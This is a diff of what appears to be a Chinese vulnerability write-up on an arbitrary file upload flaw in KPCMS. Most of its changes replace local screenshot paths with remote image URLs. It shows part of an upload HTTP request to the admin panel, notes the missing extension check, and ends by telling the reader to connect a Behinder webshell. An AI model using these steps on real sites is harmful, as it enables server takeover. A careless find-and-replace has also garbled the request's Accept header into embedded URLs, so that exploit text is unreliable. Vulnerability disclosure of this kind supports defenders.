@@ -22,7 +22,7 @@ https://gitee.com/qingzhanwang/kpcms
 http://xxx.xxx.xxx.xxx/admin.php/index/login.html
 ```
 
-![](image/kp-1.png)
+![](http://wikioss.peiqi.tech/vuln/kp-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 源码中没有对上传文件的后缀检测
 
@@ -30,15 +30,15 @@ http://xxx.xxx.xxx.xxx/admin.php/index/login.html
 thinkphp/library/think/File.php
 ```
 
-![](image/kp-2.png)
+![](http://wikioss.peiqi.tech/vuln/kp-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 任意找一处文件上传点
 
-![](image/kp-3.png)
+![](http://wikioss.peiqi.tech/vuln/kp-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 上传抓包获取文件地址
 
-![](image/kp-4.png)
+![](http://wikioss.peiqi.tech/vuln/kp-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ```
 POST /admin.php/index/upload.html?dir=image HTTP/1.1
@@ -49,7 +49,7 @@ Upgrade-Insecure-Requests: 1
 Origin: http://192.168.1.108:88
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Referer: http://192.168.1.108:88/admin.php/config/index.html
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
@@ -100,4 +100,4 @@ session_start();
 
 连接冰蝎木马即可
 
-![](image/kp-5.png)
+![](http://wikioss.peiqi.tech/vuln/kp-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
